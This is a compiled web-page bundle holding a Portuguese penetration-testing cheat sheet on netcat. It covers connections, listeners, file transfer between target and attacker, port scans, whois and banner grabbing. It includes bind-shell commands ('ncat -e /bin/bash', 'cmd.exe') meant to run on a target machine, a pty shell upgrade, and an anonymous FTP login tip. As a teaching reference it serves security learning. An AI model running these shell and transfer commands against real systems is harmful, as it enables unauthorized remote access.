"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[6306],{4233:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>h,frontMatter:()=>r,metadata:()=>d,toc:()=>l});var s=o(4848),a=o(8453);const r={id:"netcat",title:"netcat"},c=void 0,d={id:"pentest/netcat",title:"netcat",description:"O utilit\xe1rio nc (ou netcat) \xe9 usado para quase tudo sob o sol envolvendo",source:"@site/docs/pentest/nc.mdx",sourceDirName:"pentest",slug:"/pentest/netcat",permalink:"/my-docs/docs/pentest/netcat",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"netcat",title:"netcat"},sidebar:"tutorialSidebar",previous:{title:"msfvenom",permalink:"/my-docs/docs/pentest/msfvenom"},next:{title:"nikto",permalink:"/my-docs/docs/pentest/nikto"}},i={},l=[{value:"Conectando",id:"conectando",level:2},{value:"Escutando",id:"escutando",level:2},{value:"Transfer\xeancia de arquivo",id:"transfer\xeancia-de-arquivo",level:2},{value:"Alvo \u2190 Atacante (Upload)",id:"alvo--atacante-upload",level:3},{value:"Alvo \u2192 Atacante (Download)",id:"alvo--atacante-download",level:3},{value:"Enviando <code>stdout</code> para Conex\xe3o",id:"enviando-stdout-para-conex\xe3o",level:2},{value:"Expondo Shell",id:"expondo-shell",level:2},{value:"Escaneando Portas",id:"escaneando-portas",level:2},{value:"Whois",id:"whois",level:2},{value:"Banner Grabbing",id:"banner-grabbing",level:2},{value:"HTTP",id:"http",level:3},{value:"FTP",id:"ftp",level:3}];function t(e){const n={a:"a",admonition:"admonition",br:"br",code:"code",em:"em",h2:"h2",h3:"h3",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.p,{children:["O utilit\xe1rio ",(0,s.jsx)(n.code,{children:"nc"})," (ou netcat) \xe9 usado para quase tudo sob o sol envolvendo\nsoquetes de dom\xednio TCP, UDP ou UNIX. Ele pode abrir conex\xf5es TCP, enviar\npacotes UDP, escutar em portas TCP e UDP arbitr\xe1rias, fazer varredura de portas\ne lidar com IPv4 e IPv6. Ao contr\xe1rio do ",(0,s.jsx)(n.code,{children:"telnet"}),", o ",(0,s.jsx)(n.code,{children:"nc"})," faz scripts bem e\nsepara as mensagens de erro no erro padr\xe3o, em vez de envi\xe1-las para a sa\xedda\npadr\xe3o, como o ",(0,s.jsx)(n.code,{children:"telnet"})," faz com alguns."]}),"\n",(0,s.jsx)(n.p,{children:"Os usos comuns incluem:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Proxies TCP simples;"}),"\n",(0,s.jsx)(n.li,{children:"Clientes e servidores HTTP baseados em shell-script;"}),"\n",(0,s.jsx)(n.li,{children:"Teste de daemon de rede;"}),"\n",(0,s.jsx)(n.li,{children:"SOCKS ou HTTP ProxyCommand para SSH;"}),"\n",(0,s.jsx)(n.li,{children:"E muito, muito mais..."}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"conectando",children:"Conectando"}),"\n",(0,s.jsxs)(n.p,{children:["Abaixo temos o uso b\xe1sico do ",(0,s.jsx)(n.code,{children:"nc"}),", utilizando por padr\xe3o o protocolo TCP:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc 172.16.1.4 110\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Em alguns casos procisamos de mais informa\xe7\xe3o, por exemplo que a conex\xe3o foi\nestabelecida e para isso utilizamos o modo verboso passando o argumento ",(0,s.jsx)(n.code,{children:"-v"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -v 172.16.1.4\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Para efetuar conex\xf5es utilizando o protocolo UDP basta utilizar o argumento\n",(0,s.jsx)(n.code,{children:"-u"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -u 127.0.0.1 9000\n"})}),"\n",(0,s.jsx)(n.h2,{id:"escutando",children:"Escutando"}),"\n",(0,s.jsxs)(n.p,{children:["\xc9 poss\xedvel expor uma porta para conex\xe3o utilizando o ",(0,s.jsx)(n.code,{children:"nc"}),", por\xe9m parece n\xe3o ser\nmuito funcional se n\xe3o utilizado para expor uma shell ou para transferir\narquivos, contudo esse modo pode ser \xfatil para validar portas abertas no\nfirewall, onde exponho uma porta e verifico se o firewall permite acesso \xe0 ela.\nPara expor essa porta no alvo utilizamos o argumento ",(0,s.jsx)(n.code,{children:"-l"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vl 5050\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Depois podemos utilizar o comando ",(0,s.jsx)(n.code,{children:"netstat"})," para verificar o estado da porta no\nsistema alvo:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"netstat -nlpt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Para portas UDP basta utilizar o argumento ",(0,s.jsx)(n.code,{children:"-u"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vlu 9000\n"})}),"\n",(0,s.jsx)(n.h2,{id:"transfer\xeancia-de-arquivo",children:"Transfer\xeancia de arquivo"}),"\n",(0,s.jsxs)(n.p,{children:["A transfer\xeancia de arquivo \xe9 muito importante porque o ",(0,s.jsx)(n.code,{children:"nc"})," n\xe3o possui a fun\xe7\xe3o\nde expor uma shell, por\xe9m o pacote ",(0,s.jsx)(n.code,{children:"ncat"}),", mantido pelo projeto do ",(0,s.jsx)(n.code,{children:"nmap"}),",\npossui essa fun\xe7\xe3o muito \xfatil. Al\xe9m disso em muitos momentos temos a necessidade\nde subir bin\xe1rios gerados pelo ",(0,s.jsx)(n.code,{children:"metasploit"})," com a inten\xe7\xe3o de persistir uma\nshell ou at\xe9 mesmo alguns scripts como o ",(0,s.jsx)(n.code,{children:"linPEAS"})," para enumera\xe7\xe3o."]}),"\n",(0,s.jsxs)(n.p,{children:["Para a transfer\xeancia de arquivos uilizando o ",(0,s.jsx)(n.code,{children:"nc"})," temos dois cen\xe1rios, um onde o\nservidor alvo espera a conex\xe3o e no outro caso onde o servidor alvo faz uma\nconex\xe3o, abaixo teremos os dois exemplos."]}),"\n",(0,s.jsx)(n.h3,{id:"alvo--atacante-upload",children:"Alvo \u2190 Atacante (Upload)"}),"\n",(0,s.jsx)(n.p,{children:"No servidor alvo:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lv 5050 > ncat\n"})}),"\n",(0,s.jsx)(n.p,{children:"No sistema do atacante:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -v 172.16.2.6 5050 < ncat\n"})}),"\n",(0,s.jsx)(n.h3,{id:"alvo--atacante-download",children:"Alvo \u2192 Atacante (Download)"}),"\n",(0,s.jsx)(n.p,{children:"No sistema do atacante:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lv 5050 < ncat\n"})}),"\n",(0,s.jsx)(n.p,{children:"No servidor alvo:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -v 172.16.2.5 > ncat\n"})}),"\n",(0,s.jsxs)(n.h2,{id:"enviando-stdout-para-conex\xe3o",children:["Enviando ",(0,s.jsx)(n.code,{children:"stdout"})," para Conex\xe3o"]}),"\n",(0,s.jsxs)(n.p,{children:["Nesse exemplo vamos enviar o output de algum comando via ",(0,s.jsx)(n.code,{children:"ncat"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -lv 5050 < <(cat /etc/os-release)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Quando fizermos a conex\xe3o na porta 5050 iremos receber a sa\xedda do comando\n",(0,s.jsx)(n.code,{children:"cat /etc/os-release"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'$ nc -v 127.0.0.1 5050\nConnection to 127.0.0.1 5050 port [tcp/*] succeeded!\nPRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nVERSION="22.04.4 LTS (Jammy Jellyfish)"\nVERSION_CODENAME=jammy\nID=ubuntu\nID_LIKE=debian\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"\nPRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"\nUBUNTU_CODENAME=jammy\n'})}),"\n",(0,s.jsx)(n.h2,{id:"expondo-shell",children:"Expondo Shell"}),"\n",(0,s.jsx)(n.p,{children:"Expondo shell no Linux:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ncat -vnlp 5050 -e /bin/bash\n"})}),"\n",(0,s.jsx)(n.p,{children:"Expondo shell no Windows:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ncat -vnlp 5050 -e cmd.exe\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.p,{children:["Os dois comandos acima s\xe3o um modelo de shell simples onde devem ser executadas\nna m\xe1quina alvo.",(0,s.jsx)(n.br,{}),"\n","Note tamb\xe9m que estamos utilizando o ",(0,s.jsx)(n.code,{children:"ncat"})," ao inv\xe9s do ",(0,s.jsx)(n.code,{children:"nc"}),", sendo que o\nprimeiro possui mais fun\xe7\xf5es."]})}),"\n",(0,s.jsxs)(n.p,{children:["Ap\xf3s obter a shell com o ",(0,s.jsx)(n.code,{children:"ncat"}),", podemos chamar um pseudo terminal usando\nPython, onde ir\xe1 melhorar consider\xe1velmente a shell:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"escaneando-portas",children:"Escaneando Portas"}),"\n",(0,s.jsxs)(n.p,{children:["Para escanear uma porta espec\xedfica basta utilizar o argumento ",(0,s.jsx)(n.code,{children:"-z"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vnz 172.16.1.5 22\n"})}),"\n",(0,s.jsx)(n.p,{children:"Escaneando um range de portas:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vnz 172.16.1.5 19-30\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsx)(n.p,{children:"Ser\xe1 escaneado da porta 19 at\xe9 a porta 30."})}),"\n",(0,s.jsxs)(n.p,{children:["Podemos tamb\xe9m especificar o ",(0,s.jsx)(n.em,{children:"timeout"})," para cada porta com o argumento ",(0,s.jsx)(n.code,{children:"-w"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vnz -w2 172.16.1.5 22\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.p,{children:["Ser\xe1 escaneado levando em considera\xe7\xe3o um ",(0,s.jsx)(n.em,{children:"timeout"})," de 2 segundos (",(0,s.jsx)(n.code,{children:"-w2"}),")."]})}),"\n",(0,s.jsxs)(n.p,{children:["Escaneando portas UDP com o argumento ",(0,s.jsx)(n.code,{children:"-u"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -vnzu 172.16.1.5 22\n"})}),"\n",(0,s.jsx)(n.h2,{id:"whois",children:"Whois"}),"\n",(0,s.jsxs)(n.p,{children:["Com o ",(0,s.jsx)(n.code,{children:"nc"}),"tamb\xe9m \xe9 capaz de fazer pesquisas de dom\xednio diretamente no\nregistro.br:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'echo "uol.com.br" | nc registro.br 43\n'})}),"\n",(0,s.jsxs)(n.admonition,{type:"caution",children:[(0,s.jsxs)(n.p,{children:["O ",(0,s.jsx)(n.strong,{children:"registro.br"})," aceita somentes dom\xednios, ASNs e blocos de IPs brasileiros.",(0,s.jsx)(n.br,{}),"\n","Para verifica\xe7\xe3o extrangeira utilize o ",(0,s.jsx)(n.strong,{children:"whois.internic.net"}),":"]}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'echo "domain google.com" | nc whois.internic.net 43\n'})})]}),"\n",(0,s.jsx)(n.h2,{id:"banner-grabbing",children:"Banner Grabbing"}),"\n",(0,s.jsx)(n.h3,{id:"http",children:"HTTP"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"$ nc -vn www.alvo.com 80\nHEAD / HTTP/1.0\n"})}),"\n",(0,s.jsx)(n.h3,{id:"ftp",children:"FTP"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"$ nc -v 192.168.1.100 21\nUSER anonymous\nPASS anonymous\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.p,{children:["Sempre teste com usu\xe1rio ",(0,s.jsx)(n.code,{children:"anonymous"})," e senha ",(0,s.jsx)(n.code,{children:"anonymous"}),".",(0,s.jsx)(n.br,{}),"\n","Caso o login tenha sido aceito, ser\xe1 retornado o c\xf3digo ",(0,s.jsx)(n.code,{children:"230 Login successful"}),"."]})}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Servidor de teste:"}),(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Domain:"})," ftp.dlptest.com",(0,s.jsx)(n.br,{}),"\n",(0,s.jsx)(n.strong,{children:"User:"})," dlpuser",(0,s.jsx)(n.br,{}),"\n",(0,s.jsx)(n.strong,{children:"Password:"})," rNrKYTX9g7z3RgJRmxWuGHbeu"]}),(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://dlptest.com/ftp-test/",children:"https://dlptest.com/ftp-test/"})})]})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(t,{...e})}):t(e)}},8453:(e,n,o)=>{o.d(n,{R:()=>c,x:()=>d});var s=o(6540);const a={},r=s.createContext(a);function c(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:c(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);